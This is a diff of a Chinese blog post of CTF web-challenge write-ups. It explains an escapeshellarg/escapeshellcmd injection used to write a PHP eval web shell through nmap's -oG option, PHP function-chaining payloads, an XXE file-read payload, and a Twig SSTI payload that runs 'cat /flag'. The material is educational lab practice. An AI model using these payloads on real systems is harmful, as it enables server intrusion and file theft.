-<p>反斜线（\）会在以下字符之前插入：&amp;#;&#96;|*?~&lt;&gt;^()[]{}$\、\x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符前面都有一个插入符号（^）。</p>
+<p>反斜线（\）会在以下字符之前插入：&amp;#;`|*?~&lt;&gt;^()[]{}$\、\x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 % 和 ! 字符前面都有一个插入符号（^）。</p>
 <p>它们组合使用时就会造成漏洞(顺序不能改变)，就借用一个大佬的例子，通俗易懂。</p>
 <pre><code>传入的参数是：172.17.0.2&#39; -v -d a=1
 经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
 经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
 最后执行的命令是curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#39;，即向172.17.0.2\发起请求，POST 数据为a=1&#39;。
-</code></pre>
-<p>也就是说，escapeshellcmd()函数转义了用于转义单引号的斜杠，导致这个单引号与后面的单引号形成了空白连接符就能执行命令了。</p>
+</code></pre><p>也就是说，escapeshellcmd()函数转义了用于转义单引号的斜杠，导致这个单引号与后面的单引号形成了空白连接符就能执行命令了。</p>
 <h2 id="nmap构造命令"><a href="#nmap构造命令" class="headerlink" title="nmap构造命令"></a>nmap构造命令</h2><p>system函数里拼接了nmap的指令字符串。nmap中的-oG参数可以将代码与命令写到文件中，比如<code>nmap &lt;?php phpinfo();?&gt; -oG 1.php</code>，就是将这个<code>phpinfo()</code>;语句写在了1.php里内了。</p>
 <p>payload<br><code>?host=&#39; &lt;?php eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code>注意这里的空格</p>
 <h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/124538469">抄的这篇文章</a></p>
 <p>一开始啥都没，最后用dirsearch扫出<code>.git</code>目录，所以是源码泄露</p>
 <p>得到源码后就是代码审计</p>
-<pre><code class="php">&lt;?php
+<pre><code class="lang-php">&lt;?php
 include &quot;flag.php&quot;;
 echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
 if (isset($_GET[&#39;exp&#39;])) &#123;
@@ -1038,25 +1023,22 @@ if (isset($_GET[&#39;exp&#39;])) &#123;
 <pre><code>gettallheaders（）
 get_defined_vars()
 session_id()
-</code></pre>
-<p>方法一：<br>payload</p>
+</code></pre><p>方法一：<br>payload</p>
 <pre><code>exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
-</code></pre>
-<p>highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名<br>next() 输出数组中的当前元素和下一个元素的值。<br>array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)<br>scandir() 函数返回指定目录中的文件和目录的数组。<br>pos() 输出数组中的当前元素的值。<br>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。</p>
+</code></pre><p>highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名<br>next() 输出数组中的当前元素和下一个元素的值。<br>array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)<br>scandir() 函数返回指定目录中的文件和目录的数组。<br>pos() 输出数组中的当前元素的值。<br>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。</p>
 <p>loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件） rray_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。</p>
 <p>方法二：</p>
-<p>上面 的正则过滤中 其实并没有过滤掉 session_id()<br>所以我们可以使用 session_id来获取 flag<br>session_id() 可以用来获取&#x2F;设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload</p>
+<p>上面 的正则过滤中 其实并没有过滤掉 session_id()<br>所以我们可以使用 session_id来获取 flag<br>session_id() 可以用来获取/设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload</p>
 <pre><code>?exp=highlight_file( session_id(session_start()));
-</code></pre>
-<h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h1><p>xxe攻击<br>payload</p>
-<pre><code class="xml">&lt;!DOCTYPE user [
+</code></pre><h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h1><p>xxe攻击<br>payload</p>
+<pre><code class="lang-xml">&lt;!DOCTYPE user [
 &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;
 ]&gt;
 &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;
 &amp;xxe;&lt;/password&gt;&lt;/user&gt;
 </code></pre>
 <h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>函数重载</p>
-<pre><code class="php">&lt;?php
+<pre><code class="lang-php">&lt;?php
 
 include &#39;flag.php&#39;;
 
@@ -1094,12 +1076,10 @@ echo &quot;the flag is: &quot;.$flag;
 <p>payload</p>
 <pre><code>
 http://2680d063-6069-4766-9e84-8a35c77507cb.node5.buuoj.cn:81/index.php?flag=flag&amp;is=flag
-</code></pre>
-<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>twig ssti模板注入</p>
+</code></pre><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>twig ssti模板注入</p>
 <p>具体可看<a href="">ctf-ssti模板注入</a><br>payload</p>
 <pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;
 </code></pre>
-
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
